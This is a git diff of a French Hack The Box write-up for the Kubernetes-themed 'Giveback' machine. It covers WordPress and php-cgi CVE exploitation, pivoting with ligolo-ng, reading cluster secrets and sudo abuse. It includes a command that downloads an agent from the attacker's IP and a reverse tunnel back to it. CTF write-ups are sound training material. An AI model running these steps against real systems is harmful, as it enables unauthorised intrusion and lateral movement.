@@ -4,9 +4,9 @@ draft = true
 title = 'Giveback'
 +++
 
-Giveback est une box linux, sortie sur hack the box le 1er novembre 2025, créée par [babywyrm](https://github.com/babywyrm). 
-(Insérer photo de la note de la box, et son icone.)
+![Photo de la box](box-picture.png)
 
+Giveback est une box linux, sortie sur hack the box le 1er novembre 2025, créée par [babywyrm](https://github.com/babywyrm).  
 Elle a pour thème un cluster kubernetes, et utilise comme techniques l'exploit de différentes CVE, le pivot entre différents containers et l'abus d'un binaire privilégié.
 
 # User.txt
@@ -15,7 +15,7 @@ Elle a pour thème un cluster kubernetes, et utilise comme techniques l'exploit 
 
 (Résultat du nmap)
 
-En énumérant le site sur le port 80, on voit que c'est un site wordpress.
+En regardant le site sur le port 80, on voit que c'est un site wordpress.
 Avec wpscan, on découvre que le site utilise le plugin Give qui est vulnérable à la CVE-2024-8353, permettant d'éxécuter du code à distance.  
 
 La CVE en question est due à un problème de désérialisation PHP. Pour plus d'explications sur l'exploit :  
@@ -56,27 +56,32 @@ KUBERNETES_PORT=tcp://10.43.0.1:443
 
 ## Pivot
 
-A partir de là, on peut continuer la box sans pivoter, néanmoins je considère ça toujours comme un plus.  
+A partir de là, on peut continuer la box sans pivoter, néanmoins je considère ça toujours comme un plus.    
+
+On pivote avec ligolo-ng.  
 Pour expliquer simplement, ligolo nous permet de rediriger le trafic réseau d’un système vers le notre.  
 Cela nous permet donc d'accéder aux ip de l'intranet et du service kubernetes depuis notre machine, histoire de simplifier le tout.
 
-On pivote avec ligolo-ng:
+--- 
+
+On importe l'agent ligolo sur la box:  
 ```sh
 php -r "echo file_get_contents('http://$MON_IP:8000/agent');" > agent
 ```
 
-On crée une interface ligolo dans ma machine:
+On crée une interface ligolo dans ma machine:  
 ```sh
 ligolo-ng -selfcert
 ```
 
-```ligolo
+Et dans ligolo:  
+```
 interface_create --name "ligolo"
 ```
 
 --- 
 
-Sur l'attaquée, on fait
+Sur la box, on fait
 ```sh
 ./agent -connect $MON_IP:11601 -ignore-cert
 ```
@@ -91,7 +96,7 @@ interface_add_route --name ligolo --route 10.43.0.0/16
 
 ## Joindre le deuxieme container
 
-Le site sur le port 5000 de cette ip est un site php utilisant php-cgi. Il est vulnérable à la CVE-2024-4577, qui permet de RCE. On utilise le repot suivant pour l'exploit : https://github.com/watchtowrlabs/CVE-2024-4577.
+Le site sur le port 5000 de cette ip est un site php utilisant php-cgi (on le voit car l'index.php du site nous le dit). Il est vulnérable à la CVE-2024-4577, qui permet de RCE. On utilise le repot suivant pour l'exploit : https://github.com/watchtowrlabs/CVE-2024-4577.
 
 pour revshell:
 ```sh
@@ -128,7 +133,6 @@ namespace
 default
 ```
 
-
 ## Connexion au serv k8
 
 On se connecte avec nos creds et on regarde les secrets
@@ -151,12 +155,16 @@ curl -v --cacert file.crt \
 
 On obtient son token, qu'on decode en base 64 et qui est son password pour ssh.
 
+```sh
+$ cat user.txt
+[REDACTED]
+```
+
 # Root.txt
 
 En arrivant sur la box, on voit avec `sudo -l` qu'on peut run le binaire /opt/debug avec les permissions sudo.  
-On voit aussi qu'on est membres du group adm et (autre groupe).
 
-Cette partie est la partie qui a rendu la note de la room aussi basse, puisqu'elle est extrêmement guessy.  
+Cette partie est la partie qui a donné une mauvaise note à la box, puisqu'elle est extrêmement guessy.  
 En effet, en lançant /opt/debug avec sudo, on nous demande un mot de passe administrateur.
 
 Vous vous souvenez des credentials du début, trouvés dans le fichier wp-config.php ? Et bien c'est pas ça.  
@@ -380,3 +388,5 @@ $ cat /my-root/root.txt
 ```
 
 Et c'est la fin de la room. Merci d'avoir suivi !
+
+![Machine Pwned !](pwned.png)
